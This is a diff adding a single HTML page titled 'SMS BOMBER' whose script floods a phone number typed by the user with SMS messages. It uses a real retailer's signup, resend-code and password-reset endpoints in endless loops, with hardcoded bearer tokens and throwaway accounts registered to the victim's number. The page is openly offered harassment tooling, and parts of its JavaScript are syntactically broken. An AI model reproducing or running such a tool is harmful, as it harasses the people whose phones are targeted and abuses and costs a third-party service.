@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>SMS Boom!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f4f6f8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        
+        .card {
+            background: #ffffff;
+            padding: 24px;
+            width: 100%;
+            max-width: 420px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+        
+        h2 {
+            margin-bottom: 16px;
+            text-align: center;
+        }
+        
+        input,
+        button {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 12px;
+            font-size: 14px;
+        }
+        
+        button {
+            background: #000;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+        }
+        
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .message {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="card">
+        <h2>!!!SMS BOMBER!!!</h2>
+
+        <input type="text" id="phone" placeholder="Phone Number" />
+
+        <button onclick="signup()">BOOM!</button>
+
+        <div class="message" id="message"></div>
+    </div>
+
+    <script>
+        const API_BASE = "https://backend.sailor.clothing/api/v2/auth";
+        const AUTH_TOKEN = "Bearer 6414489|6HR6n3G7KoZ1p83agUxRzDEXfa0dDYzJsRk8xPaU";
+
+        function appendMessage(text, type = "info") {
+            const messageBox = document.getElementById("message");
+            const p = document.createElement("div");
+
+            p.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
+            p.style.marginBottom = "6px";
+
+            if (type === "success") p.style.color = "green";
+            if (type === "error") p.style.color = "red";
+
+            messageBox.appendChild(p);
+        }
+
+        async function forgot(phone) {
+            appendMessage("Sending password reset request...");
+
+            try {
+                const response = await fetch(
+                    "https://backend.sailor.clothing/api/v2/auth/password/forget_request", {
+                        method: "POST",
+                        mode: "cors",
+                        credentials: "include",
+                        headers: {
+                            "Accept": "application/json",
+                            "Content-Type": "application/json",
+                            "Authorization": "Bearer 6415494|TDIbtifRxYorz1HyNxTOsQs4FNlnWjihO494uhtX"
+                        },
+                        body: JSON.stringify({
+                            email_or_phone: phone,
+                            send_code_by: "phone"
+                        })
+                    }
+                );
+
+                const data = await response.json();
+
+                if (response.status === 422 || data ? .errors) {
+                    appendMessage(
+                        data ? .message || "Invalid phone number or account not found.",
+                        "error"
+                    );
+                    return;
+                    return false;
+                }
+
+                if (data.result === false) {
+                    appendMessage(data.message || "Request failed.", "error");
+                    return;
+                    return false;
+                }
+
+                if (data.result === true) {
+                    appendMessage(
+                        data.message || "Reset code sent successfully.",
+                        "success"
+                    );
+                    return true;
+                }
+
+            } catch (error) {
+                appendMessage("Network error while sending reset request.", "error");
+                console.error(error);
+                return false;
+            }
+        }
+
+        async function retryForgot(phone) {
+            while (true) {
+                const success = await forgot(phone);
+                if (!success) {
+                    appendMessage("Forgot failed. Stopping retries.", "error");
+                    return;
+                }
+            }
+
+            appendMessage("All retry attempts failed.", "error");
+        }
+
+
+        async function signup() {
+
+            appendMessage("Signing up...")
+
+            function generateRandomEmail(domain) {
+                // Generate a random string using Math.random() and base 36 encoding (0-9, a-z)
+                const randomString = Math.random().toString(36).substring(2, 10);
+
+                // Combine the random string with the domain
+                const email = `${randomString}@${domain}`;
+
+                return email;
+            }
+
+            // Example usage:
+            const emailAdd = generateRandomEmail("gmail.com");
+            const pass = Math.random().toString(36).substring(2, 10);
+            const phone = document.getElementById("phone").value;
+
+            const payload = {
+                country_code: "BD",
+                phone: phone,
+                email: emailAdd,
+                password: pass,
+                password_confirmation: pass
+            };
+
+            try {
+                const response = await fetch(`${API_BASE}/signup`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Accept": "application/json",
+                        "Authorization": AUTH_TOKEN
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                const data = await response.json();
+
+                if (response.status === 422 || data ? .errors ? .phone) {
+                    appendMessage("This phone number is already registered.", "error");
+                    appendMessage("Trying forgot", "info")
+
+                    retryForgot(phone);
+                    return;
+                }
+
+
+                if (data.result === true && data.user_id) {
+                    appendMessage(data.message + " Sending verification code...");
+                    while (true) {
+                        await resendCode(data.user_id);
+                    }
+                } else {
+                    appendMessage(data.message || "Signup failed.");
+                }
+
+            } catch (error) {
+                appendMessage("Network error. Please try again.");
+                console.error(error);
+            }
+        }
+
+        async function resendCode(userId) {
+
+
+            try {
+                const response = await fetch(`${API_BASE}/resend_code`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Accept": "application/json",
+                        "Authorization": AUTH_TOKEN
+                    },
+                    body: JSON.stringify({
+                        user_id: userId,
+                        register_by: "phone"
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.result === true) {
+                    appendMessage("Verification code sent successfully.");
+                } else {
+                    appendMessage(JSON.toString(data));
+                }
+
+            } catch (error) {
+                appendMessage("Error sending verification code.");
+                console.error(error);
+            }
+        }
+    </script>
+
+</body>
+
+</html>
